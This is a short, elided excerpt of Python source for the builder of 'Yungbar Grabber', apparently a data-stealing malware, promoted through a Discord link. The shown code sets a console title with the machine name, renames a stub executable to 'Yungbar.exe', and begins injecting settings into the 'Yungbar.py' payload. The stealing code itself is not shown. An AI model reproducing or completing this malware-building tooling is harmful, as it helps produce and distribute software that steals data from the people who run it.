# discord: https://discord.gg/bH3CvNnqsg ( offical discord channel of the Yungbar )
# Coded by Kero.inc
# Builder of Yungbar Grabber
...
try:
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f"Yungbar Grabber | Builder | {os.getenv('computername')}")
except:
    pass

# Class for building the Yungbar
class Build:
    ...
    def CallFuncions(self) -> None:
        try:
            ...
            if os.path.exists("stub.exe"):
                os.rename("stub.exe", "Yungbar.exe")
    ...
    def WriteSettings(self) -> None:
        with open("Yungbar.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
